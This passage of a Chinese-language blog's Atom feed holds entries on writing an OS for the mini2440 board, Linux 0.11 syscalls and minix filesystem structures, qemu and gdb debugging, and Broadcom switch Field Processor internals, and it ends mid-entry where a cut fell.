<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>芯机智</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://demonelf.github.io/"/>
  <updated>2019-08-29T04:26:00.125Z</updated>
  <id>http://demonelf.github.io/</id>
  
  <author>
    <name>madhex</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>编写操作系统思路</title>
    <link href="http://demonelf.github.io/EMBEDDED/mini2440/%E7%BC%96%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%80%9D%E8%B7%AF.html"/>
    <id>http://demonelf.github.io/EMBEDDED/mini2440/编写操作系统思路.html</id>
    <published>2019-08-29T04:27:44.162Z</published>
    <updated>2019-08-29T04:26:00.125Z</updated>
    
    <content type="html"><![CDATA[<p>计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗</p><p>​                   内存(有可能需要考虑 MMU和cache等)</p><p>​                CPU(中断)</p><p>操作系统分为 两部分 ：</p><ol><li>资源部分：以文件系统的方式呈现</li><li>调度部分：以多进程的方式呈现</li></ol><p>操作系统说复杂也确实很复杂，但是如果从简单点的角度去看他，其实也没那么玄乎，我们先不要考虑mmu，毕竟没有mmu的情况也有好多操作系统。<br>没有mmu就是直接内存。<br><img src="内核内存分布.JPG" alt=""><br>开始不要有内存顾虑，然后就是中断，我们自己写的库是直接调用的，<br>而内核也算是一个库吧，只是这个库自己也在运行，并且调用方式是通过中断。</p><p>我们的大体方向为两面夹击型，其实有人问嵌入式linux怎么学，应该先从什么开始学，我理解为没有什么固定应该从那里学，从你最熟悉的部分开始学，这样好理解，你直接只会裸板开发，那你就能简单熟悉下linux命令，开始设备驱动。如果之前是应用开发，那就从你熟悉角度去理解。不管从哪个方向走，都会是条条大路通罗马。</p><p>像如果想熟悉linux kernel，我们还是最好从简单的开始，两面夹击型。<br>我们最好有裸板经验，然后是设备驱动经验。然后再开始内核框架。我想这样最好了。</p><p>操作系统的功能：<br>    1.管理硬件，这就是为什么linux要有设备驱动的概念。<br>    2.程序调度，能让这个机器cpu等发挥更多的性能。</p><p>以上也是比bootloader多出的重要部分。当然为了多进程的调度更加方便和内存利用最大化，还应多出了重要器件mmu。并且，为了让进程能用到硬件，还通过中断提供了一系列系统调用。其实对应用来说内核就是一个稍微特殊点的库而已。</p><p>我们先还管不了应用，我们先把内核自己运行溜了，并且能管理起来各个硬件再说，这其实就是实现了一个简单的bootloader一样的东西。<br>然后我们想更容易用这些硬件，我们提出了文件系统等一些概念。</p><p>大家看看内核这个程序的大致结构：<br>这个图果然很经典。<br><img src="内核结构图.PNG" alt=""></p><p>调度部分是本内核程序控制别的程序运行功能。额，暂可把它当作内核大大的一个小功能即可。我的的思路是先把内核自己想要运转溜了，所以，就不要想先玩转别人。</p><p>貌似，这有点像我们先实现一个bootload。bootload的功能就是加载内核。而我们这个功能只是多一点而已。</p><p>我应该简单总结下bootload的编写流程，然后如果在bootload基础上添加：文件系统、进程调度等功能。实现操作系统的样子。</p><p>操作系统的发展估计也是这个样子，逐步添加小功能呗。</p><p>bootload编写流程：</p><ol><li>熟悉板子引导流程，编写最开始的引导部分代码，最好是汇编。</li><li>初始化一些必要的硬件可以用c。有：时钟、ram、nand、串口。</li><li>编写shell。添加一些必要的命令。<br>基本就以上这些。算是最基本的bootloader。</li></ol><p>我们可以在以上bootloader的基础上添加例如：文件系统，内存管理、调度等功能就成为了操作系统。</p><p>有了思路就好办了，</p><p>由于操作系统比较庞大，而且要求每个模块的逻辑协作比较复杂。所以我想在实现操作的时候可以先订个小目标。例如：我先不实现调度部分，我先能实现资源部分。能够通过文件系统访问资源。</p><p>第一个小目标：在终端实现执行ls<br>    当然，由于硬件支持用户态和内核态能，先都放下，我们只在内核态实现。<br>    其实，如果添加用户态和内核态功能，程序在调用的时候只是利用了中断方式，但为了简单和入门。我们不走此流程。现在只是先入门并能够开始。<br>    首先：我把硬件平台简单描述下，毕竟我们是要在一个特定的硬件实现系统。当然我们不深入讨论体系结构或是组成原理。不然我们有可能陷入另一个学科，而不是此次的实践目的了。<br>    一个程序想要通过CPU实现执行，必须是CPU可随机访问的。我所说的内存当然满足此要求。但是内存是掉电丢失的，所以我们要把程序先放到可以掉电不丢失的硬盘上。当然不是硬盘软盘、光盘、u盘随便你喜欢什么都可以，只要能保存程序就可以了。有了以上认识，我们就可以总结出，想要运行我们的系统。必须要有cpu、内存、硬盘。<br>    我们以s3c2440为例子，s3c2440的cpu为arm920，内存为外置sdram， 硬盘为nand<br>    当然用到的硬件肯定不止这些，但是我们可以用到哪些了解哪些就可以了。</p><p>以上为最基本硬件信息， 但是我们还需要有个输入输出、不然怎么操作我们的系统 ，呵呵。</p><p>说到输入输出，又想提一下串口和文件系统， 因为我们想通过串口操作我们的系统，但是我们又不想太low，直接操作硬件，不然我们要操作系统干什么，而linux是一切皆文件的思想，文件的体现方式为文件系统实现的。所以还是有必要提一下文件系统。</p><p>我们先以read/write来入手，层层剥开文件系统的面纱。</p><p>因为想要</p><p>write 的实现原理<br>以下为write定义</p><blockquote><p>lib目录下 - 用户系统接口</p></blockquote><p>write.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_syscall3(<span class="keyword">int</span>,write,<span class="keyword">int</span>,fd,<span class="keyword">const</span> <span class="keyword">char</span> *,buf,<span class="keyword">off_t</span>,count)</div></pre></td></tr></table></figure></p><p>unistd.h<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscall3(type,name,atype,a,btype,b,ctype,c) \</span></div><div class="line">type name(atype a,btype b,ctype c) \</div><div class="line">&#123; \</div><div class="line"><span class="keyword">long</span> __res; \</div><div class="line">__<span class="function">asm__ <span class="title">volatile</span> <span class="params">(<span class="string">"int $0x80"</span> \</span></span></div><div class="line">: "=a" (__res) \</div><div class="line">: <span class="string">"0"</span> (__NR_##name),<span class="string">"b"</span> ((<span class="keyword">long</span>)(a)),<span class="string">"c"</span> ((<span class="keyword">long</span>)(b)),<span class="string">"d"</span> ((<span class="keyword">long</span>)(c))); \</div><div class="line"><span class="keyword">if</span> (__res&gt;=<span class="number">0</span>) \</div><div class="line"><span class="keyword">return</span> (type) __res; \</div><div class="line">errno=-__res; \</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>; \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>从以上可以看出wirte是通过80中断到内核的，内核通过以下处理</p><blockquote><p>kernel目录下 - 内核中断处理</p></blockquote><p>set_system_gate(0x80,&amp;system_call);<br>和<br>system_call.s和sys_call_table[]</p><p>真正执行到：read_write.c</p><blockquote><p>fs目录下 - 真正调用到内核的函数 </p></blockquote><p>int sys_write(unsigned int fd,char * buf,int count)</p><p>可以看出，期间以上参数可以通过寄存器传递。</p><p>也完全像内核注释上所说，用户通过系统调用到了文件系统。<br>​    </p><p>在用户态write的函数，就不用说了大家肯定已经很熟悉了，<br>有必要说的就剩下内核终端处理部分，<br>和文件系统实现部分了。</p><p>想要实现文件系统，根据上面的图，大家发现我们要先实现块设备。<br>呵呵。我们又要先实现字符设备和块设备驱动程序。</p><p>字符设备先放放，我们先看看块设备。</p><p>块设备底下为nand flash，我们这个块设备要把nand flash抽象后给文件系统提供接口。</p>]]></content>
    
    <summary type="html">
    
      计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗 ​ 内存(有可能需要考虑 MMU和cache等) ​ CPU(中断) 操作系统分为 两部分 ：
1. 资源部分：以文件系统的方式呈现 2. 调度部分：以多进程的方式呈现 操作系统说
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
      <category term="mini2440" scheme="http://demonelf.github.io/categories/EMBEDDED/mini2440/"/>
    
    
  </entry>
  
  <entry>
    <title>文件系统理解</title>
    <link href="http://demonelf.github.io/EMBEDDED/mini2440/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%90%86%E8%A7%A3.html"/>
    <id>http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html</id>
    <published>2019-08-29T04:18:26.915Z</published>
    <updated>2019-08-29T04:16:02.640Z</updated>
    
    <content type="html"><![CDATA[<p>以下都是自己瞎理解，并不一定对，但会慢慢完善。</p><p>我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。<br>但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。<br>这要我们能清楚的管理硬件。简单既是美。这也是linux可能玩不了复杂的，只能简单的想到一切皆文件的理念吧。</p><p>我们先不考虑虚拟文件系统，其实虚拟文件系统只是在我们这个真实的文件系统上再虚拟一层。因为可能由于兴趣原因，我们不想在每个硬盘上都放一种真实文件，有的像放fat，有的想放ext3，有的想法minix。呵呵，有点开玩笑。由于一个电脑上有多个文件系统。我们又不想让用户用写个应用还得open_ext3 read_ext3z这个样子。所以我们又封装了以下open-&gt;open_ext3,用户还是只要调用open就可以了，所以有了虚拟文件系统。<br>不过我们现在不想管，我们就一个文件系统minix。因为我怕乱了，额。</p><p><img src="内核结构图.PNG" alt=""></p><p>还是以上经典图：</p><p>下面minix文件系统在硬盘上的结构<br><img src="文件系统布局.JPG" alt=""></p><p><strong>超级块</strong>用于存放盘设备上文件系统结构信息</p><p><strong>i节点</strong>存放着文件系统中文件或目录名的索引节点，每个文件或目录都有一个i节点。</p><p><strong>逻辑块位图</strong>用于描述盘上每个数据盘款的使用情况。</p><p><strong>i节点位图</strong>用于说明i节点是否被使用。</p><blockquote><p>int bmap(struct m_inode * inode,int block)</p></blockquote><p>bmap实现了以上i节点和超级块的关联。</p><p>namei也是利用bmap解析文件系统中树目录结构</p><p>下面你会发现namei处在什么位置。</p><p>linux下文件系统和块设备包含的一些概念：</p><ol><li>主设备号：blk_dev[NR_BLK_DEV]</li><li>从设备号：</li></ol><p>通过blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;<br>注册void do_hd_request(void)功能</p><p>看看linux 0.11是怎么通过read调用到硬盘上的。</p><p>调用流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">应用</div><div class="line">| read-&gt;中断</div><div class="line">V</div><div class="line">read_write.c----------------文件系统上层接口-----------------</div><div class="line">| sys_read</div><div class="line">V</div><div class="line">fs/block_dev.c--------------文件系统下层/块设备接口-----------</div><div class="line">| block_read</div><div class="line">V</div><div class="line">fs/buffer.c </div><div class="line">| breada</div><div class="line">V</div><div class="line">blk_drv/ll_rw_blk.c---------块设备/设备驱动上层接口----------</div><div class="line">| ll_rw_block-&gt;make_request-&gt;add_request-&gt;request_fn</div><div class="line">| -&gt;do_hd_request</div><div class="line">V</div><div class="line">kernel/blk_drv/hd.c---------设备驱动底层接口----------------</div><div class="line">| do_hd_request</div><div class="line">V</div></pre></td></tr></table></figure></p><p>每个任务都有一个自己的task_struct <em>current;<br>current中包含了任务打开的文件fd。<br>struct file </em> filp[NR_OPEN];</p><p>open.c<br>open<br>|<br>V<br>open_namei<br>次函数是操作文件系统树目录的重要体现接口。</p><p>open_namei返回的是struct m_inode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">struct m_inode &#123;</div><div class="line">unsigned short i_mode;</div><div class="line">unsigned short i_uid;</div><div class="line">unsigned long i_size;</div><div class="line">unsigned long i_mtime;</div><div class="line">unsigned char i_gid;</div><div class="line">unsigned char i_nlinks;</div><div class="line">unsigned short i_zone[9];</div><div class="line">/* these are in memory also */</div><div class="line">struct task_struct * i_wait;</div><div class="line">unsigned long i_atime;</div><div class="line">unsigned long i_ctime;</div><div class="line">unsigned short i_dev;</div><div class="line">unsigned short i_num;</div><div class="line">unsigned short i_count;</div><div class="line">unsigned char i_lock;</div><div class="line">unsigned char i_dirt;</div><div class="line">unsigned char i_pipe;</div><div class="line">unsigned char i_mount;</div><div class="line">unsigned char i_seek;</div><div class="line">unsigned char i_update;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p><img src="i节点结构.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">struct super_block &#123;</div><div class="line">unsigned short s_ninodes;</div><div class="line">unsigned short s_nzones;</div><div class="line">unsigned short s_imap_blocks;</div><div class="line">unsigned short s_zmap_blocks;</div><div class="line">unsigned short s_firstdatazone;</div><div class="line">unsigned short s_log_zone_size;</div><div class="line">unsigned long s_max_size;</div><div class="line">unsigned short s_magic;</div><div class="line">/* These are only in memory */</div><div class="line">struct buffer_head * s_imap[8];</div><div class="line">struct buffer_head * s_zmap[8];</div><div class="line">unsigned short s_dev;</div><div class="line">struct m_inode * s_isup;</div><div class="line">struct m_inode * s_imount;</div><div class="line">unsigned long s_time;</div><div class="line">struct task_struct * s_wait;</div><div class="line">unsigned char s_lock;</div><div class="line">unsigned char s_rd_only;</div><div class="line">unsigned char s_dirt;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p><img src="超级块结构.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      以下都是自己瞎理解，并不一定对，但会慢慢完善。
我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。
但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
      <category term="mini2440" scheme="http://demonelf.github.io/categories/EMBEDDED/mini2440/"/>
    
    
  </entry>
  
  <entry>
    <title>qemu模拟mini2440调试手册</title>
    <link href="http://demonelf.github.io/EMBEDDED/mini2440/qemu%E6%A8%A1%E6%8B%9Fmini2440%E8%B0%83%E8%AF%95%E6%89%8B%E5%86%8C.html"/>
    <id>http://demonelf.github.io/EMBEDDED/mini2440/qemu模拟mini2440调试手册.html</id>
    <published>2019-08-29T04:18:26.899Z</published>
    <updated>2019-08-29T04:15:56.472Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前情提要</strong></p><p>最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。<br>一来是想巩固下arm，在就是学习下操作系统的相关只是。<br>哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。<br>没想到越看越老，从3.x到2.x, 再到0.12 呵。<br>我想真把 0.12 玩的非常通其实也不是件易事。<br>从硬件到系统，mmu到进程，等等。如何有机的组在一起运行起来，也是很费精力。</p><p>废话不多说，学习的环境为，gentoo + qemu_mini2440.</p><p>说实话如果你条件方便，还是买个板子吧， 因为学操作系统和硬件非常相关。<br>而qemu虚拟只是模拟出用到的基本功能，和真实的硬件环境确实相差不少。<br>例如，在真是环境中，mini2440 的启动方式为，sd 或nand 到 stepping stone,<br>然后再纠结的到sdram。<br>但是到了qemu你就醉了，它是直接把代码拷贝到sdram的。你说你是不很闹心。<br>玩起来是不并不是随心所欲了 呵呵。</p><p>发现此问题是通过gdb调试发现。</p><p>在此顺便记下qemu_gdb方法：</p><p>qemu启动：</p><blockquote><p>qemu-system-arm -M mini2440 -m 256m -mtdblock mini2440_nand128.bin -serial stdio -nographic -gdb tcp::1234 -S</p></blockquote><p>gdb启动：</p><h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) file vmlinux</div><div class="line">(gdb) target remote :1234</div><div class="line">(gdb) b start_kernel</div><div class="line">(gdb) c</div><div class="line">(gdb) x /200xb 0x004013ce  //以十六进制查看内存</div><div class="line">(gdb) x /10i main   //以汇编的方式查看内存</div><div class="line">(gdb) disassemble main   //等同上面</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      前情提要 最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。 一来是想巩固下arm，在就是学习下操作系统的相关只是。
哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。 没想到越看越老，从3
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
      <category term="mini2440" scheme="http://demonelf.github.io/categories/EMBEDDED/mini2440/"/>
    
    
  </entry>
  
  <entry>
    <title>BCM芯片FP原理及相关SDK数据结构介绍</title>
    <link href="http://demonelf.github.io/EMBEDDED/BCM%E8%8A%AF%E7%89%87FP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%9B%B8%E5%85%B3SDK%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D.html"/>
    <id>http://demonelf.github.io/EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍.html</id>
    <published>2019-08-29T04:18:26.899Z</published>
    <updated>2019-08-29T04:16:45.181Z</updated>
    
    <content type="html"><![CDATA[<p><span style="color:#333333; font-family:幼圆; font-size:10pt">作者: 北京—小武<br></span></p><a id="more"></a><p><span style="color:#333333; font-family:幼圆; font-size:10pt">邮箱：<a href="mailto:night_elf1020@163.com" target="_blank" rel="external"><span style="color:#336699">night_elf1020@163.com</span></a><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">新浪微博：北京-小武<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">BCM芯片有几个大的模块： VLAN、L2、L3和FP等几个，其中FP的使用也最为灵活，能解析匹配数据包文的前128字节比特级的内容，动作包括转发、丢弃、结合qos修改相应字段、分配vid、流镜像、流重定向、指定端口转发（比如CPU口）、指定下一跳转发往、指定隧道转发等，往往在实现功能上有意想不到的功效。简单来说，如果硬件和BSP分别是九阳真经和九阴真经的话，那么port和vlan是少林七十二项绝技的组合，L2转发则是显得有点悠闲的峨眉派功夫，当然L3则是以太极拳为代表的武当派功夫，那么FP可以是以乾坤大挪移、吸星大法等为代表的魔教的邪而又邪的”旁门左道”，当然其他功能是零零散散的其他门派功夫。能够灵活运用好FP是增加很多交换机新功能的一种常用的手段。本文总结下FP这个模块BCM在硬件上的实现原理及SDK的相关数据结构。因为FP在实现功能上的灵活性，在此希望能抛砖引玉，激发大家更多的应用FP实现新功能的火花。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:18pt"><strong><a name="t1">BCM芯片FP实现原理</a></strong></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">FP的全称是Fields Processors，也称为ContentAwareProcess（CAP），在BCM较早的芯片称为Fast Filter Processors（FFP），和现在的FP相比有一些原理不同，不过现在交换芯片已经不再使用FFP，所以在此也不再介绍。FP本质来说，是一组相互之间有关联的表，一起通过查找、匹配等来决定对报文施加的动作；在BCM芯片交换机中，有三种查找查找方式：hash，index，tcam。FP的查找主要用到了index和tcam，其中CAM的全称是ContentAddressable Memory，中文是内容寻址器，TCAM则是Ternary ContentAddressable Memory，中文称为三态内存寻址器，TCAM的实现是通过对应比特位+掩码产生三种匹配方式：掩码为0表示不关心、掩码为1且对应位为1或掩码为1且对应位为0。 这就是三态的具体含义。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt"><br>在我们自研交换机所用的芯片中有三个FP：VFP(VLAN FP)、IFP（ingres FP）和EFP（Egress FP），另外在四代芯片kylin卡中曾出现外扩FP，称为E-IFP，表项大小为128K，为L2和L3转发用，有点openflow的意味。其中VFP主要用于对报文tag的处理，比如添删或修改vid的灵活QINQ的实现就基于此FP；IFP的用途比较多，主要是对进入端口后的报文进行处理，主要有入口acl、流重定向、流镜像、设置下一跳、为qos数据报文分类等用途；EFP的用途和IFP类似，但是因为EFP是报文在转出前在出端口进行处理的规则，IFP有的动作类型在EFP不太适用。虽然三种FP用途和数据包流经顺序不太一样，但是硬件原理是一致的。下面介绍下FP的硬件原理。<br></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/08/080416_0642_BCMFPSDK1.png" alt=""><span style="color:#333333; font-size:10pt"><span style="font-family:Arial"> </span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">图1 FP原理组成图<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">图1中，每一个查找引擎和策略引擎及后面的counter资源和meter资源组合成一个规则组，芯片称之为一个slice，从图1可以看出，FP的实现有五部分组成：<br></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">智能解析模板<span style="color:#333333">：主要将报文信息（最多报文前128字节，可以精确到每一位bit）根据对每个slice的care字段将各对应字段解析出来，再加上前面L2、L3的转发信息，一起送给每个slice的查找引擎去匹配；<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">查找引擎：<span style="color:#333333">将解析出来的字段按照TCAM方式去查找本slice的规则是否有匹配的，即HIT的，只要有一条hit的即刻返回这条规则的index不再继续查找本slice后面规则，后面即使还有匹配的规则；这样做就是为了保证一个slice内部规则的优先级；如果没有匹配说明此slice没有匹配的规则或根本就没有规则，后面的流程也无需再走；<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">策略引擎：<span style="color:#333333">根据查找引擎得到的index直接索引策略引擎的动作，动作类型有转发、丢弃、重定向（包括到CPU口且可指定队列）、流镜像（包括到CPU口且可指定队列）、修改报文特定的字段（COS、DSCP、EXP等）、与后面的meter一起对报文染色并对不同染色报文指定相应动作、指定下一跳、指定ECMP、指定TTL是否修改、指定URPF的模式等相关动作；需要说明的是，一条规可以对报文执行多种动作，当然需要报文动作之间是不冲突的，即slice规则的动作冲突是靠配置下发来检查的，同一条规则有冲突的动作无法下发硬件；<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">Counter和meter资源<span style="color:#333333">： counter资源用于计数，有基于byte和packet的两种方式；meter主要用于测速，然后根据速度对报文进行染色（绿、黄和红）然后对报文应用不同的QOS策略；meter的工作原理可以参见我原先写的有关令牌桶相关文档。<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">动作冲突决策引擎：<span style="color:#333333">前面说过，一条slice的动作冲突是靠配置下发检查来实现的，冲突的动作无法同时下发到硬件；但是FP通常有多个slice，每个slice都有规则被匹配且动作时间有冲突时，需要动作冲突决策引擎来处理到底执行哪一个规则的动作，如果多个动作不冲突都执行；原则是丢弃、重定向等优先级最高，其他时候看slice号（这个slice号有的芯片只支持是物理的，高级芯片支持虚拟slice号），slice号越大优先级越高；<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">我们一条规则的匹配报文长度信息是有限的，对于IPV4报文同时匹配SMAC、DMAC、SIP、DIP等信息的时候，就不够了，芯片提供了将两条规则合并成一条规则，组成更大长度规则的方法，主要有图2示的两种,：<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">    <img src="http://www.madhex.com/wp-content/uploads/2016/08/080416_0642_BCMFPSDK2.png" alt=""></span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                      </span><span style="font-family:幼圆">图2 两种slice宽模式<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">第一种是将一条slice的规则分为前后两部分，然后进行如图2左边的方式拼成double模式，这种模式称为double wide模式；第二种是用两条slice，直接如图2右边所示的方式拼成double模式，这种拼接方式称之为slice-paring模式。这两种模式，有的低级芯片都不支持，只能用单倍模式，有的芯片支持其中一种，我们的redstone交换机就只支持左边的这种方式。还有的芯片可以同时支持这两种拼接方式，那么就可以利用这点拼接处具有更大长度信息的四倍模式：<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial"> <img src="http://www.madhex.com/wp-content/uploads/2016/08/080416_0642_BCMFPSDK3.png" alt=""></span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                      </span><span style="font-family:幼圆"> 图3 四倍key模式<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">这种模式常用于IPV6报文的匹配中，因为IPV6的SIP和DIP实在太长了，再加上匹配其他信息，只能用四倍模式才能完全覆盖所有字段。但是我们的redstone交换机只支持slice-pairng模式，所以在IPV6报文的匹配中需要做折中。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">前面我们提到slice有物理slice和虚拟slice，这个与物理内存和虚拟内存有点类似，FP都有物理slice，在高级的芯片上，为了更好的解决slice之间的动作冲突，对slice进行了虚拟编号，虚拟slice号越大优先级越高，这样就可以实现动作的优先级指定；可能做过物理slice的同学能体会为了保证各种应用slice的优先级在软件处理所做的代码处理工作有多么的艰辛；硬件进步这么一步，支持虚拟slice后，这部分工作就完全交给硬件来处理了，我们只需要指定优先级高低就可以了。而且虚拟slice还支持虚拟slice组的概念，每一个虚拟slice组就像一条slice一样，只会有一个动作产生出，这样就又大大减少了动作冲突的机会，而且还能使得每种应用使用更多的slice资源，无需考虑因为物理slice带来的动作优先级打破应用的优先级，更符合实际。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:18pt"><strong><a name="t2">BCM对FP操作的接口</a></strong></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">BCM的SDK提供了四套对于FP资源使用和管理的函数接口，需要视具体应用环境和个人喜好来定夺，四种接口如下：<br></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">SOC API<span style="color:#333333">：直接硬件表项或寄存器操作，BCM各种问题明确不提倡的接口，因为需要配置人员管理和组织大量的逻辑；<br></span></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">Bcmx接口<span style="color:#333333">：通常不被使用的接口，因为不太灵活，且SDK被改造成为所有ACL规则为一个大的group，现在暂时IFP只有协议规则和ACL使用，所以还勉强满足需求，以lport作为端口的配置参数；但是每次下发新规则都要先删除原来规则，这个是没有必要的；这套接口和下面BCM接口的区别不是很大。相关函数接口有：<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_create<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_create_id<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_compress<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_install<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_remove<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_group_destroy<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_entry_create<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_entry_destroy<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_entry_destroy_all<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_data_qualifier_destroy<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_data_qualifier_destroy_all<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_qualify_clear<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_data<em>qualifier</em>**_add<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcmx_field_data<em>qualifier</em>**_ delete等。<br></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">Bcm接口<span style="color:#333333">：BCM中对FP操作的最灵活的一组接口，非常适合运营商多种应用的场合，这组接口传递的参数也非常详细；相关函数接口有：<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_create<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_create_id<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_priority_set<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_compress<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_install<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_remove<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_group_destroy<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_create<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_create_id<br></span></p><p><span 